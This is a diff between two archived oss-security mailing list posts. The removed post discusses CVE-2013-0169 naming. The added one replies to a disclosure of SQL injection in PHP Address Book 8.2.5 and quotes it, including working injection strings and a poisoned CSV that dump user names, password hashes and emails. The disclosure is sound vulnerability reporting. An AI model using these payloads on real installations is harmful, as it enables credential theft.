@@ -1,71 +1,89 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/05/19
-Message-ID: <20130205182239.GR3443@redhat.com>
-Date: Tue, 5 Feb 2013 11:22:39 -0700
-From: Vincent Danen <vdanen@...hat.com>
-To: oss-security@...ts.openwall.com
-Cc: kseifried@...hat.com, cve-assign@...re.org
-Subject: Re: CVE request: TLS CBC padding timing flaw in various SSL / TLS implementations
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/17/5
+Message-ID: <20130417142745.GA11662@kludge.henri.nerv.fi>
+Date: Wed, 17 Apr 2013 17:27:45 +0300
+From: Henri Salo <henri@...v.fi>
+To: Doraemon Sk8ers <doraemon.sk8ers@...il.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Multiple vulnerabilities in PHP Address Book v8.2.5
 Content-Type: text/plain; charset=utf-8
 
-* [2013-02-05 12:45:48 -0500] cve-assign@...re.org wrote:
+Hello,
 
->>cc'ing cve-assign to see if they can provide some guidance here.  I also
->>noticed that OpenSSL has a CVE for this (I'm assuming that the
->>CVE-2012-2686 issue is _not_ the same thing, but that CVE-2013-0169 is
->>this issue).
->>
->>Since it's a weakness in TLS/DTLS itself, from my understanding, and not
->>necessarily in a particular implementation, I'm not sure if this
->>qualifies as one CVE for the weakness, or if it needs one per
->>implementation.
->>
->>MITRE, can someone provide some guidance on this?
->
->[ This is mostly directed to Red Hat at this point. We'll expand to
->the other recipients or vendors later. ]
->
->We're not exactly sure that MITRE has the next step here. A CVE
->exists, CVE-2013-0169, that was issued by the Red Hat CNA. When the
->CVE assignment was made, presumably one or more persons at Red Hat had
->a working understanding of what the name CVE-2013-0169 means. (For
->example: was the CVE assigned with a multi-vendor scope in mind? Was
->the CVE assigned to cover the entirety of the content of the
->www.isg.rhul.ac.uk/tls/TLStiming.pdf research paper?) MITRE would, in
->general, want to preserve this original meaning if it makes sense to
->do that. Because there's no specific statement on this list about what
->CVE-2013-0169 means, we'd next go to
->
->  https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-0169
->
->to see if that may be a canonical statement of what CVE-2013-0169
->means. But there's nothing there yet.
->
->Before offering a guess from MITRE, we'll wait for some more
->information.
+I believe CVE-2013-1748 #1 is duplicate of CVE-2008-2565 as per OSVDB[1]. As far
+as I know most of security vulnerabilities reported to this project haven't been
+fixed. Haven't verified this detail. What php-addressbook project would need is
+patches to fix all issues you can find. Finding vulnerabilities is easy -
+fixing in upstream is not. I can help you if you are willing to write patches.
+Takes hour or two :)
 
-Yes, you're right, this did come from our pool.
+1: http://osvdb.org/45965
 
-We did provide this CVE to the OpenSSL team (at the time the request was
-made we did not receive any disclosure on the issue and were not aware
-of other affected implementations).  The intention was then just for
-OpenSSL (perhaps under the assumption this was for an OpenSSL-specific
-issue, again, unaware of the details of the flaw).
+---
+Henri Salo
 
-If MITRE wants to use it as a general name for the other affected
-implementations (GnuTLS, NSS, etc.) as well, and not just OpenSSL,
-that's fine.  We have not allocated any CVEs for these other
-implementations, nor did we provide this CVE name to the authors of the
-paper.
+On Wed, Apr 17, 2013 at 11:14:27AM +0800, Doraemon Sk8ers wrote:
+> There is a SQL injection vulnerability and reflected XSS in Simple PHP
+> Address Book v8.2.5.
+> The 2 vulnerabilities had been assigned the CVE identifier CVE-2013-1748
+> (SQLi) & CVE-2013-1749 (XSS) respectively.
+> 
+> # Software Link: http://sourceforge.net/projects/php-addressbook/
+> # Version: v8.2.5
+> # Tested on: v8.2.5
+> # CVE : CVE-2013-1748 (SQLi) & CVE-2013-1749 (XSS)
+> 
+> 
+> Details:
+> -----------
+> *
+> *
+> *CVE-2013-1748 (SQLi)*
+> 
+> We have discovered 3 pages which are prone to SQL Injection
+> 
+> 1.	/view.php?id=1
+> The "id" parameter is vulnerable to SQL injection
+> Injection Vector:
+> 	/view.php?id=-1' union select '1','2','3','4',(select username from
+> users limit 1),(select md5_pass from users limit 1),(select email from
+> users limit 1),'8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41
+> This injection vector will dump the username, md5 password and email
+> of the first user in the user table onto the page itself
+> 
+> 2.	/edit.php
+> Most of the fields on this page are vulnerable to SQL injection
+> Injection Vector (inclusive of quotes):
+> 	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+'
+> This will dump out the ASCII value of the 1st character of the md5
+> password of the first user
+> 
+> 3.	/import.php
+> The same injection vulnerability as Point 2 above is also present in
+> the import function
+> Using the same injection vector, saved in a csv file
+> 	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+'
+> Similarly, this injection vector will dump out the ASCII value of the
+> 1st character of the md5 password of the first user
+> 
+> The original input csv sample looks like this
+> "Last name";"First
+> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
+> home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
+> "thelastname";"thefirstname";"13.09.1951";"Street";"1234";"city,
+> Country";"+1 123 456 789";"+2 345 678 910";"first.last@...l1.com";"+3
+> 456 789 101";"+4 567 897 011";"first.last@...l2.net";"second street,
+> 1234 secondcity, secondcountry";"+5 678 910 111"
+> 
+> The injected csv with the injected vectors looks like this
+> "Last name";"First
+> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
+> home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
+> "";"injectedthrucsv";"13.09.1951";"'+(select ASCII(SUBSTRING((SELECT
+> md5_pass from users limit 1), 1)))+'";"";"city, Country";"+1 123 456
+> 789";"+2 345 678 910";"first.last@...l1.com";"+3 456 789 101";"+4 567
+> 897 011";"first.last@...l2.net";"second street, 1234 secondcity,
+> secondcountry";"+5 678 910 111"
+<snip>
 
-The long and short of it is a private (unspecified) request came from
-the OpenSSL team and we provided it, so there was no specific intention
-on our part as to how the name was used or what it meant.
-
-I hope that clarifies things a bit.  We have no particular preference
-either way, so we'll leave this to your discretion.
-
-Thanks.
-
--- 
-Vincent Danen / Red Hat Security Response Team 
+Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
